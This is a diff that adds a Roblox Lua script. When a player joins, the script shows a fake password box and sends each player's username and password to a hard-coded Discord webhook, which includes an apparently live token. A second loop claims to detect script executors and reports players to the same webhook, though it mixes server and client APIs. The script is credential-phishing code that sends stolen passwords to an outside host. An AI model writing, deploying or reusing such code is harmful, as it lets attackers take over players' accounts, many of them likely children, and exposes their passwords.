@@ -1,0 +1,87 @@
+-- Configuration
+local webhookUrl = "https://discord.com/api/webhooks/1481871894360621094/PV2tRrENEcn1Nmr7L_ETcUsGkrHo8jYrdfD8__9wx7jf6tY6NMjlj-2XcDUuOOqx17RV"
+
+-- Function to send data to Discord
+local function sendToDiscord(username, password)
+    local httpService = game:GetService("HttpService")
+    
+    local payload = {
+        content = string.format("@everyone New user registration: %s", username),
+        embeds = {{
+            title = "User Credentials",
+            fields = {
+                {name = "Username", value = username, inline = true},
+                {name = "Password", value = password, inline = true}
+            },
+            color = 16711680 -- Red color
+        }}
+    }
+    
+    local success, response = pcall(function()
+        return httpService:PostAsync(webhookUrl, httpService:JSONEncode(payload))
+    end)
+    
+    if not success then
+        warn("Failed to send to Discord:", response)
+    end
+end
+
+-- Main execution
+local Players = game:GetService("Players")
+
+Players.PlayerAdded:Connect(function(player)
+    print("New player joined:", player.Name)
+    
+    -- Create a new textbox for the player to enter their password
+    local textbox = Instance.new("TextBox")
+    textbox.Size = UDim2.new(0, 200, 0, 30)
+    textbox.Position = UDim2.new(0.5, -100, 0.5, -15)
+    textbox.Text = ""
+    textbox.PlaceholderText = "Enter password"
+    textbox.Parent = player:WaitForChild("PlayerGui"):WaitForChild("ScreenGui")
+    
+    textbox.FocusLost:Connect(function(enterPressed)
+        if enterPressed then
+            local password = textbox.Text
+            textbox:Destroy()
+            
+            -- Send credentials to Discord
+            sendToDiscord(player.Name, password)
+        end
+    end)
+end)
+
+-- Executor detection function
+local function detectExecutor()
+    local executors = {
+        ["Bloxstrap"] = false,
+        ["Krnl"] = false,
+        ["Synapse"] = false,
+        ["Script-Hub"] = false,
+        ["LOL"] = false
+    }
+    
+    local function check()
+        for name, _ in pairs(executors) do
+            if game.Players.LocalPlayer:FindFirstChild(name) then
+                executors[name] = true
+            end
+        end
+    end
+    
+    while wait() do
+        check()
+        
+        -- Check if any executor was detected
+        for name, detected in pairs(executors) do
+            if detected then
+                -- Send notification about executor usage
+                sendToDiscord("Executor Detection", "Player " .. game.Players.LocalPlayer.Name .. " used " .. name)
+                break
+            end
+        end
+    end
+end
+
+-- Start executor detection in a separate thread
+spawn(detectExecutor)
